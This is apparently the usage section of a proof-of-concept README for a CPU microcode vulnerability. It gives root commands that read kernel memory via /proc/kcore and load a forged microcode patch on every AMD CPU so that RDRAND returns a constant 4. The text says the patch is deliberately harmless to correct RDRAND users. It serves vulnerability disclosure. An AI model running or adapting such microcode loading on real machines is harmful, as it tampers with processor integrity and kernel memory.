## How to use

Tested on `AMD EPYC 7B13 64-Core Processor` (Milan) and `AMD Ryzen 9 7940HS w/ Radeon 780M Graphics` (Phoenix).

As root:
```
# Load the microcode patch on every CPU
PAGE_OFFSET_BASE=$(
    objdump -s --start-address=0x$(cat /proc/kallsyms |
    awk '/D page_offset_base/{print $1}') /proc/kcore |
    awk '/ffff/{print $2 $3; exit}' |
    sed 's/\(..\)\(..\)\(..\)\(..\)\(..\)\(..\)\(..\)\(..\)/\8\7\6\5\4\3\2\1/')
for i in `seq 0 $(nproc)`; do ./ucode_loader ./milan_rdrand_carryclear_encrypted.bin 0x${PAGE_OFFSET_BASE:?} $i; done

# Test rdrand
./rdrand_test
rdrand_test: rdrand failed and returned 4
```

We've provided these PoCs to demonstrate that this vulnerability allows an adversary to produce arbitrary microcode patches. They cause the RDRAND instruction to always return the constant 4, but also set the carry flag (CF) to 0 to indicate that the returned value is invalid. Because correct use of the RDRAND instruction requires checking that CF is 1, this PoC can not be used to compromise correctly functioning confidential computing workloads. Additional tools and resources will be made public on March 5.
